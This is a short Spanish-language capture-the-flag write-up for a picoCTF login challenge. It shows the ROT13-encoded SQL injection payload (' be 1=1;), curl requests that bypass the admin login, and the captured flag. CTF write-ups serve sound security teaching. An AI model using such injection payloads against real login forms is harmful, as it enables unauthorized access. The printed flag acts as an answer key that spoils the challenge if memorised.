## Objetivo
There is a secure website running at `https://jupiter.challenges.picoctf.org/problem/29132/` ([link](https://jupiter.challenges.picoctf.org/problem/29132/)) or http://jupiter.challenges.picoctf.org:29132. Try to see if you can login as admin!

Hint
- Seems like the password is encrypted.
## Solucion
Activamos el campo oculto y obtemos lo siguiente
```
password: Carlos
SQL query: SELECT * FROM admin where password = 'Pneybf'
```
Podemos ver de que manera esta hecha la consulta y que se esta encriptando la contraseña.
Utilizamos ciberchef para ver que tipo de encriptado es el cual es rot13, convertimos la inyeccion ' 1 or 1=1; a root13 (' be 1=1;)  y obtenemos la bandera:

Your flag is: picoCTF{3v3n_m0r3_SQL_06a9db19}
## Solucion 2
```bash
┌──(wil㉿DESKTOP-FKOIV4I)-[~]
└─$ curl https://jupiter.challenges.picoctf.org/problem/29132/login.php -d "password=hola&debug=1"
<pre>password: hola
SQL query: SELECT * FROM admin where password = 'ubyn'
</pre><h1>Login failed.</h1>
┌──(wil㉿DESKTOP-FKOIV4I)-[~]
└─$ curl https://jupiter.challenges.picoctf.org/problem/29132/login.php -d "password=' be 1=1;&debug=1"
<pre>password: ' be 1=1;
SQL query: SELECT * FROM admin where password = '' or 1=1;'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{3v3n_m0r3_SQL_06a9db19}</p>
┌──(wil㉿DESKTOP-FKOIV4I)-[~]
└─$

```
## Notas adicionales
## Referencias